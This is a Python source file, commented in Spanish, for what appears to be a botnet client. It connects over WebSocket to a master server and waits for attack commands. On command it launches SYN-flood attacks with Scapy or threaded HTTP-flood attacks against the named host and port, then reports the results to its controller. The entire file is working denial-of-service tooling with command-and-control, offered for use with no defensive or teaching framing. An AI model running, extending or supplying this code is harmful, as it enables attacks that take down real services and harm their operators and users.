import asyncio
import json
import logging
import socket
import websockets
from scapy.all import IP, TCP, sr1, send
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Configuración de logs
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Websocket server address
URL = 'localhost:5001'
# Cambiar para producción
MASTER_URL = f'ws://{URL}'

# Attack Function - SYN Flood
async def syn_flood_attack(target, port, count=1000, max_threads=100):
    """Ejecutar ataque SYN Flood con ThreadPoolExecutor"""

    try:
        # Optional to get IP (Scapy works better with IPs)
        host = urlparse(f"http://{target}").netloc if not target.startswith(('http', 'https')) else urlparse(target).netloc
        if not host:
            host = target
            
        logger.info(f"[INFO] Resolviendo host {host}...")
        # Obtener IP
        ip = socket.gethostbyname(host)
        host = ip
        logger.info(f"[INFO] Host resuelto: {host}")

    except Exception as e:
        logger.error(f"[ERROR] Error al analizar la URL: {e}")
        return

    def send_syn_packet_sync(packet_num):
        """Enviar un paquete SYN (versión síncrona para threads)"""
        try:
            syn_packet = IP(dst=host)/TCP(dport=port, flags="S")
            response = sr1(syn_packet, timeout=1, verbose=0)
            
            if response and response.haslayer(TCP):
                tcp_layer = response.getlayer(TCP)
                if tcp_layer.flags == 0x12:  # SYN-ACK
                    rst_packet = IP(dst=host) / TCP(
                        dport=port, 
                        flags="R", 
                        seq=response.ack
                    )
                    send(rst_packet, verbose=0)
                    return True
            return False
        except Exception as e:
            logger.debug(f"[ERROR] Error en paquete {packet_num}: {e}")
            return False

    try:
        logger.info(f"[INFO] Iniciando SYN Flood contra {host}:{port} ({count} paquetes, {max_threads} threads)")
        
        successful = 0
        failed = 0
        
        # Usar ThreadPoolExecutor para envío paralelo
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Ejecutar todos los paquetes en paralelo
            futures = [executor.submit(send_syn_packet_sync, i) for i in range(count)]
            
            # Esperar resultados y contar
            for i, future in enumerate(futures):
                try:
                    result = await asyncio.wrap_future(future)
                    if result:
                        successful += 1
                    else:
                        failed += 1
                    
                    # Log cada 100 paquetes
                    if (i + 1) % 100 == 0:
                        logger.info(f"[INFO] Progreso: {i+1}/{count} paquetes enviados")
                        
                except Exception as e:
                    failed += 1
                    logger.debug(f"[ERROR] Error procesando resultado: {e}")
        
        logger.info(f"[SUCCESS] SYN Flood completado: {successful} exitosos, {failed} fallidos")
        return {'successful': successful, 'failed': failed}
        
    except Exception as e:
        logger.error(f"[ERROR] Error durante SYN Flood: {e}")
        return {'successful': 0, 'failed': count}

# Attack Function - HTTP Flood
async def http_flood_attack(target, count=1000, max_threads=100):
    """Ejecutar ataque HTTP Flood con ThreadPoolExecutor"""
    import requests
    from requests.exceptions import RequestException
    
    try:
        # Asegurar que la URL tenga protocolo
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        logger.info(f"[INFO] Iniciando HTTP Flood contra {target} ({count} requests, {max_threads} threads)")
        
        def send_http_request(request_num):
            """Enviar una petición HTTP (versión síncrona para threads)"""
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                }
                
                response = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
                
                if response.status_code < 500:  # Considerar exitoso si no es error del servidor
                    return True
                return False
                
            except RequestException as e:
                logger.debug(f"[ERROR] Error en request {request_num}: {e}")
                return False
            except Exception as e:
                logger.debug(f"[ERROR] Error inesperado en request {request_num}: {e}")
                return False
        
        successful = 0
        failed = 0
        
        # Usar ThreadPoolExecutor para envío paralelo
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Ejecutar todas las peticiones en paralelo
            futures = [executor.submit(send_http_request, i) for i in range(count)]
            
            # Esperar resultados y contar
            for i, future in enumerate(futures):
                try:
                    result = await asyncio.wrap_future(future)
                    if result:
                        successful += 1
                    else:
                        failed += 1
                    
                    # Log cada 100 peticiones
                    if (i + 1) % 100 == 0:
                        logger.info(f"[INFO] Progreso: {i+1}/{count} requests enviados")
                        
                except Exception as e:
                    failed += 1
                    logger.debug(f"[ERROR] Error procesando resultado: {e}")
        
        logger.info(f"[SUCCESS] HTTP Flood completado: {successful} exitosos, {failed} fallidos")
        return {'successful': successful, 'failed': failed}
        
    except Exception as e:
        logger.error(f"[ERROR] Error durante HTTP Flood: {e}")
        return {'successful': 0, 'failed': count}

# Process attack function
async def process_attack(command, websocket):
    """Procesar comando de ataque recibido del servidor"""
    try:
        # Formato esperado: "ATTACK:TIPO:URL[:PUERTO]"
        # Primero separar ATTACK y TIPO
        parts = command.split(':', 2)  # ['ATTACK', 'TIPO', 'resto']
        
        if len(parts) < 3:
            logger.error(f"[ERROR] Formato de comando inválido: {command}")
            await websocket.send(json.dumps({
                'type': 'attack_error',
                'message': 'Formato inválido',
                'command': command
            }))
            return
        
        attack_type = parts[1].upper()
        rest = parts[2]
        
        port = 80
        count = 1000
    
        # Detectar si tiene protocolo (http:// o https://)
        if rest.startswith('http://') or rest.startswith('https://'):
            # Caso: URL con protocolo
            # Formato: "https://example.com[:puerto]" o "https://example.com/path[:puerto]"
            
            # Separar por '/' para obtener el dominio
            url_parts = rest.split('/')
            protocol = url_parts[0]  # "https:"
            domain_part = url_parts[2] if len(url_parts) > 2 else ""
            
            # Ahora separar el dominio de posible puerto
            domain_parts = domain_part.split(':')
            target = f"{protocol}//{domain_parts[0]}"  # Reconstruir URL base
            
            # Parsear puerto si existe
            if len(domain_parts) > 1:
                try:
                    port = int(domain_parts[1])
                except ValueError:
                    port = 443 if protocol == 'https:' else 80
            else:
                port = 443 if protocol == 'https:' else 80
            
        else:
            # Caso: URL sin protocolo
            # Formato: "example.com[:puerto]"
            rest_parts = rest.split(':')
            target = rest_parts[0]
            
            # Parsear puerto
            if len(rest_parts) > 1:
                try:
                    port = int(rest_parts[1])
                except ValueError:
                    port = 80
        
        logger.warning(f"[WARN] ATAQUE RECIBIDO")
        logger.warning(f"   Tipo: {attack_type}")
        logger.warning(f"   Objetivo: {target}")
        logger.warning(f"   Puerto: {port}")
        logger.warning(f"   Intensidad: {count}")
        
        # Enviar confirmación de inicio
        await websocket.send(json.dumps({
            'type': 'attack_started',
            'attack_type': attack_type,
            'target': target,
            'port': port
        }))
        
        # Ejecutar ataque según el tipo
        result = None
        
        if attack_type == 'DDOS':
            result = await syn_flood_attack(target, port, count)
            
        elif attack_type == 'SYN-FLOOD':
            result = await syn_flood_attack(target, port, count)
            
        elif attack_type == 'HTTP-FLOOD':
            result = await http_flood_attack(target, count)
            
        else:
            logger.error(f"[ERROR] Tipo de ataque desconocido: {attack_type}")
            await websocket.send(json.dumps({
                'type': 'attack_error',
                'message': f'Tipo de ataque desconocido: {attack_type}'
            }))
            return
        
        # Reportar completado
        await websocket.send(json.dumps({
            'type': 'attack_complete',
            'attack_type': attack_type,
            'target': target,
            'port': port,
            'status': 'success',
            'result': result
        }))
        
        logger.info("[SUCCESS] Ataque completado y reportado al servidor")
        
    except Exception as e:
        logger.error(f"[ERROR] Error procesando ataque: {e}")
        await websocket.send(json.dumps({
            'type': 'attack_error',
            'message': str(e),
            'command': command
        }))

# Websocket connection function
async def handler():
    """Manejar conexión WebSocket con el servidor maestro"""
    retry_count = 0
    max_retries = 5
    
    while retry_count < max_retries:
        try:
            logger.info(f"[INFO] Conectando a {MASTER_URL}...")
            
            async with websockets.connect(MASTER_URL) as websocket:
                retry_count = 0
                logger.info(f"[SUCCESS] Conectado a {MASTER_URL}")
                
                # Enviar status inicial
                await websocket.send(json.dumps({
                    'type': 'status',
                    'message': 'Bot activo y esperando comandos'
                }))
                
                # Recibir mensajes
                async for message in websocket:
                    try:
                        data = json.loads(message)
                        
                        if data.get('type') == 'command':
                            command = data.get('message', '')
                            logger.info(f"Comando recibido: {command}")
                            
                            # Procesar comandos de ataque
                            if command.startswith('ATTACK:'):
                                await process_attack(command, websocket)
                            else:
                                logger.info(f"[INFO] Mensaje general: {command}")
                                
                    except json.JSONDecodeError as e:
                        logger.error(f"[ERROR] Error decodificando mensaje: {e}")
                    except Exception as e:
                        logger.error(f"[ERROR] Error procesando mensaje: {e}")
                        
        except websockets.exceptions.ConnectionClosedOK:
            logger.warning("[WARN] Conexión cerrada por el servidor")
            break
            
        except websockets.exceptions.ConnectionClosedError as e:
            logger.error(f"[ERROR] Conexión cerrada con error: {e}")
            retry_count += 1
            if retry_count < max_retries:
                wait_time = min(2 ** retry_count, 3600)  # Exponential backoff, max 3600s
                logger.info(f"[INFO] Reintentando en {wait_time}s... (intento {retry_count}/{max_retries})")
                await asyncio.sleep(wait_time)
            else:
                logger.error("[ERROR] Máximo de reintentos alcanzado")
                break
                
        except websockets.exceptions.InvalidStatusCode as e:
            logger.error(f"[ERROR] Estado HTTP inválido: {e}")
            break
            
        except Exception as e:
            logger.error(f"[ERROR]Error inesperado: {e}")
            retry_count += 1
            if retry_count < max_retries:
                await asyncio.sleep(5)
            else:
                break

if __name__ == "__main__":
    try:
        logger.info("[INFO] Iniciando bot cliente...")
        asyncio.run(handler())
    except KeyboardInterrupt:
        logger.info("\n [WARN] Bot detenido manualmente")
    except Exception as e:
        logger.error(f"[ERROR] Error fatal: {e}")